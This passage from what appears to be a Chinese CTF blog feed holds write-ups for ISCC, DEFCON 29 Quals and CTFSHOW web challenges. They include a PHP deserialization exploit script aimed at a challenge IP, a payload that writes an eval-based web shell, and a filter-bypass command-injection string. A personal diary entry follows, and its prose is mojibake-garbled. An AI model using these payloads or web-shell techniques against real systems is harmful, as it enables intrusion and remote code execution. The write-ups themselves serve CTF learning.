class="string">&quot;%5C00&quot;</span>,urldecode(str_replace(<span class="string">&quot;%2A&quot;</span>,<span class="string">&#x27;%5C2A&#x27;</span>,str_replace(<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;%5C00&quot;</span>,<span class="variable">$b</span>)))))));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br></pre></td></tr></table></figure><p><code>exp</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://39.96.91.106:7050/&#x27;</span> + <span class="string">&#x27;?%3F=O:10:&quot;ISCC_Login&quot;:3:&#123;S:1:&quot;b&quot;;O:13:&quot;ISCC_ReSetCMD&quot;:1:&#123;S:10:&quot;%5C00%5C2A%5C00new_cmd&quot;;S:9:&quot;cat%20/flag&quot;;&#125;S:1:&quot;c&quot;;O:12:&quot;ISCC_Command&quot;:0:&#123;&#125;S:1:&quot;a&quot;;O:11:&quot;ISCC_Upload&quot;:2:&#123;S:1:&quot;e&quot;;O:13:&quot;ISCC_ReSetCMD&quot;:1:&#123;S:10:&quot;%5C00%5C2A%5C00new_cmd&quot;;S:9:&quot;cat%20/flag&quot;;&#125;S:1:&quot;d&quot;;O:12:&quot;ISCC_Command&quot;:0:&#123;&#125;&#125;&#125;&#x27;</span></span><br><span class="line">f = (<span class="string">&quot;isccIsCciScc1scc&quot;</span>, <span class="string">&quot;Du1&quot;</span>)</span><br><span class="line">f1 = <span class="built_in">open</span>(<span class="string">&quot;git.png&quot;</span>, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line">files = &#123;<span class="string">&quot;_SESSION&quot;</span>: f, <span class="string">&quot;iscc_file&quot;</span>: f1&#125;</span><br><span class="line">r = requests.post(url, files=files)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/05/05/8WQS5DsKVhRuN3X.png"></p><p>flag å‡ºï¼š<code>ISCC&#123;hjh_Y0u_sT1ll_D0nt_KNoW_wHiCH_ONe_is_true!:P&#125;</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021_DEFCON_29_CTF_Qualifier_WP</title>
      <link href="2021/05/04/2021-DEFCON-29-CTF-Qualifier-WP/"/>
      <url>2021/05/04/2021-DEFCON-29-CTF-Qualifier-WP/</url>
      
        <content type="html"><![CDATA[<p>äº”ä¸€çš„æ—¶å€™ä¹Ÿé¡ºä¾¿çœ‹äº†çœ‹ DEFCONï¼Œåæ¥ @ç‹ ç‹  è¦æˆ‘å¸®å¿™æ•´ç†ä¸€ä¸‹ pwn é¢˜é™„ä»¶çš„æ—¶å€™æ‰å‘ç°ä¸€ä»¶äº‹ï¼Œpwn é¢˜ä¸€å…±æœ‰ 15 é“ï¼Œå†çœ‹çœ‹ webï¼Œæ¯”èµ›æ‰“åˆ°ä¸€åŠçš„æ—¶å€™æ‰ä¸Šä¸€é“ï¼Œä¹Ÿæ˜¯å”¯ä¸€ä¸€é“ï¼Œå®³ã€‚</p><p><img src="https://i.loli.net/2021/05/04/qsEpu2v6wOnTPL3.png"></p><p>è·Ÿç€å›½å¤–å¤§ä½¬çš„ wp å¤ç°äº†ä¸€ä¸‹ã€‚</p><h2 id="threefactooorx"><a href="#threefactooorx" class="headerlink" title="threefactooorx"></a>threefactooorx</h2><ul><li><p><a href="https://buer.haus/2021/05/03/defcon-29-ctf-qualifier-3factooorx-write-up/">https://buer.haus/2021/05/03/defcon-29-ctf-qualifier-3factooorx-write-up/</a></p></li><li><p><a href="https://graneed.hatenablog.com/entry/2021/05/03/091823">https://graneed.hatenablog.com/entry/2021/05/03/091823</a></p></li></ul><p>åªæ˜¯è·Ÿç€å¤ç°äº†ä¸€ä¸‹ï¼Œæ”¹å¤©å†è¯¦ç»†è¡¥ä¸€ä¸‹ï¼ˆç»å…¸å·æ‡’</p><p>ä¸»è¦è€ƒç‚¹æ˜¯ js æ··æ·†ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">let</span> p = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;3fa&#x27;</span>);</span></span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> c1 = <span class="built_in">document</span>.createElement(<span class="string">&#x27;div&#x27;</span>);</span></span><br><span class="line">  p.append(c1);</span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> c2 = <span class="built_in">document</span>.createElement(<span class="string">&#x27;div&#x27;</span>);</span></span><br><span class="line">  p.append(c2);</span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> c3 = <span class="built_in">document</span>.createElement(<span class="string">&#x27;div&#x27;</span>);</span></span><br><span class="line">  p.append(c3);</span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> c4 = <span class="built_in">document</span>.createElement(<span class="string">&#x27;div&#x27;</span>);</span></span><br><span class="line">  p.append(c4);</span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> c5 = <span class="built_in">document</span>.createElement(<span class="string">&#x27;div&#x27;</span>);</span></span><br><span class="line">  p.append(c5);</span><br><span class="line">  p.removeChild(c1);</span><br><span class="line">  p.removeChild(c2);</span><br><span class="line">  p.removeChild(c3);</span><br><span class="line"><span class="javascript">  c4.setAttribute(<span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAA&quot;</span>,<span class="string">&quot;1234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901&quot;</span>);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">id</span>=<span class="string">&quot;thirdfactooor&quot;</span> <span class="attr">rows</span>=<span class="string">&quot;4&quot;</span> <span class="attr">cols</span>=<span class="string">&quot;40&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;3fa&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>init();<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æäº¤å³è·å¾— flagï¼š<code>000&#123;themorefactorsthebetter_butyouneedatleastthree&#125;</code></p><p><img src="https://i.loli.net/2021/05/04/tRiqf6LsFH9PMGe.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021_CTFSHOW_å¤§ç‰›æ¯_WP</title>
      <link href="2021/05/03/2021-CTFSHOW-%E5%A4%A7%E7%89%9B%E6%9D%AF-WP/"/>
      <url>2021/05/03/2021-CTFSHOW-%E5%A4%A7%E7%89%9B%E6%9D%AF-WP/</url>
      
        <content type="html"><![CDATA[<p>äº”ä¸€çœ‹äº†ä¸‹ ctfshow çš„å¤§ç‰›æ¯ï¼Œweb é¢˜è´¨é‡æŒºé«˜çš„ï¼Œæœ‰çš„é¢˜å½“æ—¶ä¸ä¼šï¼Œç°åœ¨å¤ç°ä¸€ä¸‹å§ã€‚</p><h2 id="easy-unserialize"><a href="#easy-unserialize" class="headerlink" title="easy_unserialize"></a>easy_unserialize</h2><p>é¢˜ç›®æºç å·²ç»ç»™å‡ºï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-04-22 17:44:48</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-04-26 11:30:38</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">main</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$settings</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;settings=<span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;display_errors&#x27;</span>=&gt;<span class="string">&#x27;On&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;allow_url_fopen&#x27;</span>=&gt;<span class="string">&#x27;On&#x27;</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">$this</span>-&gt;params=<span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;settings <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">            ini_set(<span class="variable">$key</span>, <span class="variable">$value</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        file_put_contents(<span class="string">&#x27;settings.inc&#x27;</span>, unserialize(<span class="keyword">$this</span>-&gt;params));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>åœ¨ <a href="https://www.php.net/manual/zh/var.configuration.php#ini.unserialize-callback-func">php manual</a> é‡Œé¢æœ‰ä¸€ä¸ªå¾ˆæœ‰è¶£çš„å˜é‡é…ç½®ï¼Œå¦‚æœåœ¨ååºåˆ—åŒ–çš„æ—¶å€™éœ€è¦å®ä¾‹åŒ–ä¸€ä¸ªæœªå®šä¹‰çš„ç±»ï¼Œå¯ä»¥è®¾ç½®å›è°ƒå‡½æ•°ä»¥ä¾›è°ƒç”¨ï¼Œæœ€å…³é”®çš„æ˜¯è¿™ä¸ªé…ç½®æ˜¯ PHP_IN_ALL çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡ ini_set æ¥è®¾ç½®</p><p><img src="https://i.loli.net/2021/05/03/PTqCp6XVEn7AQHv.png"></p><p>å¯ä»¥é€šè¿‡ spl_autoload æ¥è‡ªåŠ¨åŠ è½½æœªå®šä¹‰çš„ç±» settingsï¼Œä¼šé»˜è®¤åŠ è½½å½“å‰ç›®å½•ä¸‹ï¼Œä»¥settingsç±»åä¸ºæ–‡ä»¶åï¼Œphp æˆ–è€… inc ä¸ºåç¼€çš„æ–‡ä»¶ï¼Œè¿™æ ·å°±å’Œ settings.inc è”ç³»åˆ°äº†ä¸€èµ·</p><p><img src="https://i.loli.net/2021/05/03/zYaB4UMjZGuyNWw.png"></p><p><img src="https://i.loli.net/2021/05/03/8ZX2MJj47DwySoq.png"></p><p>æ•…æˆ‘ä»¬å¯ä»¥å…ˆåˆ©ç”¨ array ååºåˆ—åŒ–å»å†™ä¸€ä¸ªğŸåˆ° settings.inc ä¸­ï¼Œç„¶ååŠ è½½å®ƒã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">settings</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">main</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$settings</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;settings=<span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;unserialize_callback_func&#x27;</span>=&gt;<span class="string">&#x27;spl_autoload&#x27;</span></span><br><span class="line">        );</span><br><span class="line">         <span class="keyword">$this</span>-&gt;params=serialize(<span class="keyword">new</span> settings());  <span class="comment">/* è®¾ç½®æœªå®šä¹‰ç±» settings */</span></span><br><span class="line">         <span class="keyword">$this</span>-&gt;params=serialize(<span class="keyword">array</span>(<span class="string">&quot;&lt;?php file_put_contents(&#x27;Du1.php&#x27;, &#x27;&lt;?php eval(\$_POST[Du1]);phpinfo();&#x27;);&quot;</span>));  <span class="comment">/* å†™ğŸ */</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> main()));</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/05/03/iH3UbY7pvdxM6Ck.png"></p><h3 id="éé¢„æœŸ"><a href="#éé¢„æœŸ" class="headerlink" title="éé¢„æœŸ"></a>éé¢„æœŸ</h3><p>å¥½å®¶ä¼™ï¼Œè¿™é¢˜è¿˜æœ‰éé¢„æœŸï¼Œåˆ©ç”¨ error_logã€unserialize_callback_func å’Œ html_error å†™ğŸï¼Œæ”¹å¤©å¤ç°ä¸€ä¸‹å§ã€‚</p><h2 id="web-checkin"><a href="#web-checkin" class="headerlink" title="web_checkin"></a>web_checkin</h2><p>è¿™é¢˜å½“æ—¶å¸ˆå‚…ä»¬éƒ½æ²¡çœ‹ï¼Œè¿æ°”å¥½æ‹¿äº†ä¸ªä¸€è¡€ã€‚ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"><span class="comment">//flag in /</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_letter</span>(<span class="params"><span class="variable">$code</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$letter_blacklist</span> = str_split(<span class="string">&quot;abcdefghijklmnopqrstuvwxyz1234567890&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; count(<span class="variable">$letter_blacklist</span>); <span class="variable">$i</span>+=<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&quot;/&quot;</span>.<span class="variable">$letter_blacklist</span>[<span class="variable">$i</span>].<span class="string">&quot;/i&quot;</span>, <span class="variable">$code</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;xi nei~&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_character</span>(<span class="params"><span class="variable">$code</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$character_blacklist</span> = <span class="keyword">array</span>(<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;\+&#x27;</span>,<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;\)&#x27;</span>,<span class="string">&#x27;\(&#x27;</span>,<span class="string">&#x27;\*&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;#&#x27;</span>,<span class="string">&#x27;`&#x27;</span>,<span class="string">&#x27;@&#x27;</span>,<span class="string">&#x27;!&#x27;</span>,<span class="string">&#x27;~&#x27;</span>,<span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\[&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;\&quot;&#x27;</span>,<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;\/&#x27;</span>,<span class="string">&#x27;\.&#x27;</span>,<span class="string">&#x27;\?&#x27;</span>,<span class="string">&#x27;,&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;&gt;&#x27;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">1</span>; <span class="variable">$i</span> &lt; count(<span class="variable">$character_blacklist</span>); <span class="variable">$i</span>+=<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&quot;/&quot;</span>.<span class="variable">$character_blacklist</span>[<span class="variable">$i</span>].<span class="string">&quot;/&quot;</span>, <span class="variable">$code</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;tongtong xi nei~&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&#x27;sandbox/&#x27;</span> . md5(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (!file_exists(<span class="variable">$dir</span>)) &#123;</span><br><span class="line">    mkdir(<span class="variable">$dir</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;code&quot;</span>])) &#123;</span><br><span class="line">    <span class="variable">$code</span> = substr(<span class="variable">$_GET</span>[<span class="string">&quot;code&quot;</span>], <span class="number">0</span>, <span class="number">12</span>);</span><br><span class="line">    check_letter(<span class="variable">$code</span>);</span><br><span class="line">    check_character(<span class="variable">$code</span>);</span><br><span class="line"></span><br><span class="line">    file_put_contents(<span class="string">&quot;<span class="subst">$dir</span>&quot;</span> . <span class="string">&quot;index.php&quot;</span>, <span class="string">&quot;&lt;?php &quot;</span>.<span class="variable">$code</span>.<span class="variable">$fuxkfile</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è™½ç„¶çœ‹èµ·æ¥è¿‡æ»¤äº†å¾ˆå¤šï¼Œä½†æ˜¯è¿˜æ˜¯ç•™äº†å¾ˆå¤šå¯ç”¨å­—ç¬¦ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bdfhjlnprtvxz24680</span><br><span class="line">&#x3D; % ) * ^ $ &#96; ! ] &#125; &#39; ; &#x2F; ? &lt; &gt;</span><br></pre></td></tr></table></figure><p>ä¸€å¼€å§‹è¿˜ä»¥ä¸ºæ˜¯å››å­—å‘½ä»¤æ‰§è¡Œã€‚ã€‚ã€‚ç»“æœå‘ç° nl å°±å®Œäº‹äº†ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;?&gt;&lt;?&#x3D;&#96;nl%09&#x2F;*&#96;</span><br></pre></td></tr></table></figure><p>å¬å¸ˆå‚…è¯´ nl å¯ä»¥æ¢æˆ prï¼Œä½†æ˜¯æ²¡æµ‹è¯•æˆåŠŸï¼ˆç–‘æƒ‘</p><h2 id="RealWorld-CyberShow"><a href="#RealWorld-CyberShow" class="headerlink" title="RealWorld_CyberShow"></a>RealWorld_CyberShow</h2><p>åƒæ˜¯è¦çˆ†ç ´ï¼Œä½†æ˜¯ä¸çŸ¥é“ enpwd å’Œ key æ˜¯æ€ä¹ˆå¾—å‡ºæ¥çš„ï¼Œç­‰ä¸€æ³¢è¯¦ç»†wp</p><h2 id="easy-CMS"><a href="#easy-CMS" class="headerlink" title="easy CMS"></a>easy CMS</h2><p>å‡ºæ˜¯å‡ºäº†ï¼Œä½†æ˜¯æ„Ÿè§‰å‘³é“ä¸å¤ªå¯¹ï¼Œæ‰€ä»¥æ‰“ç®—è‡ªå·±å»å®¡ä¸€å®¡æè‡´çš„æºç å†å›æ¥è¡¥å‘ - -</p>]]></content>
      
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é—²è°ˆ</title>
      <link href="2021/04/30/%E9%97%B2%E8%B0%88/"/>
      <url>2021/04/30/%E9%97%B2%E8%B0%88/</url>
      
        <content type="html"><![CDATA[<p>æ—¶é—´æ€»æ˜¯è¿‡å¾—é£å¿«ï¼Œè¿›å…¥å¤§å­¦å·²ç»å¿«ä¸¤å¹´äº†ï¼Œå››æœˆå°†è¿‡ï¼Œäº”ä¸€å‡æœŸè¦å›ä¸€è¶Ÿå®¶çœ‹çœ‹è€çˆ·å­å’Œè€å¦ˆå­ï¼Œæ™šä¸Šå’Œä½³å»ç¥é¾™æ¹–è½¬äº†è½¬ï¼Œé£æ™¯è¿˜æ˜¯å¾ˆä¸é”™ã€‚</p><p><img src="https://i.loli.net/2021/04/30/QaUsXqS9BAEPg7k.jpg" alt="ç¥é¾™å¤§å‰§é™¢"></p><p>æ´—æ¾¡çš„æ—¶å€™æƒ³äº†æƒ³ä¼¼ä¹ä»æ¥æ²¡æœ‰ç»™è‡ªå·±å†™è¿‡ä»€ä¹ˆæ‰€è°“çš„æ€»ç»“ï¼Œå›æƒ³è‡ªå·±è¿™ 19 å¹´ï¼Œä¸­äºŒã€å‚»é€¼çš„äº‹æƒ…åšäº†ä¸å°‘ï¼Œå°±æ˜¯è®¤çœŸçš„äº‹æƒ…åšå¾—å¤ªå°‘äº†ï¼Œè®©çˆ¸å¦ˆå¤´ç–¼æ‹…å¿ƒï¼Œä¹Ÿè®©å¾ˆå¤šäººå¤±æœ›ã€‚</p><p>å’Œä½³é—²è°ˆçš„æ—¶å€™èŠèµ·æ¥å°æ—¶å€™çš„äº‹æƒ…ï¼Œæ€»æ˜¯ä¼šè§‰å¾—ç‰¹åˆ«æœ‰æ„æ€ï¼Œé‚£ä¸ªæ—¶å€™è§‰å¾—å¾ˆå¸…ã€å¾ˆè£…Bçš„äº‹æƒ…ï¼Œç°åœ¨çœ‹èµ·æ¥å°´å°¬åˆ°å¯ä»¥ç”¨è„šè¶¾æŠ å‡ºä¸‰å®¤ä¸¤å…ï¼Œæ¯æ¬¡è°ƒä¾ƒè‡ªå·±å½“æ—¶è¢«å®¶é‡Œè€çˆ·å­æŠ“ç€ç—›æ‰“çš„æ—¶å€™ï¼Œä¹Ÿä¼šæƒ³åˆ°å½“æ—¶çš„è‡ªå·±ä¸ºä»€ä¹ˆé‚£ä¹ˆä¼šé—¯ç¥¸æƒ¹äº‹ï¼Œé‚£ä¸ªæ—¶å€™çš„è‡ªå·±è¦æ˜¯çŸ¥é“å¤šå¹´ä¹‹åè‡ªå·±æŠŠè¿™ä¸€åˆ‡å½“ä½œèŒ¶ä½™é¥­åçš„ä¹å­æ´¥æ´¥æœ‰å‘³åœ°å“å°æ—¶ï¼Œä¼šä¸ä¼šç¨å¾®ä¹–ä¸€ç‚¹ï¼Œå°‘è®©è€çˆ·å­æ°”å¾—ç¡ä¸ç€è§‰ã€‚</p><p>ä»å°åˆ°å¤§å°±ä¸€ç›´ä¸å–œæ¬¢åšè€å¸ˆå¸ƒç½®çš„ä½œä¸šï¼Œç›´åˆ°ä»Šå¤©è¿™ä¸€ç‚¹ä¹Ÿæ²¡æœ‰å˜è¿‡ï¼Œå¤§å­¦ä»¥å‰æ˜¯å› 